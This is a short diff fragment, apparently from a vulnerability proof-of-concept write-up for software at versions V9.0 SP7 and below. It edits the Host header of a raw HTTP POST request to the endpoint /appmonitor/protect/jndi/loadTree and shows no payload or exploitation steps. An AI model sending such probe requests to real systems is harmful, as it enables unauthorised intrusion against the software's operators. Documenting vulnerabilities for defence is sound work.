@@ -10,7 +10,7 @@ V9.0 SP7及以下版本
 
 ```jsx
 POST /appmonitor/protect/jndi/loadTree HTTP/1.1
-Host:
+Host:host
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
 Accept: */*
 Accept-Encoding: gzip, deflate
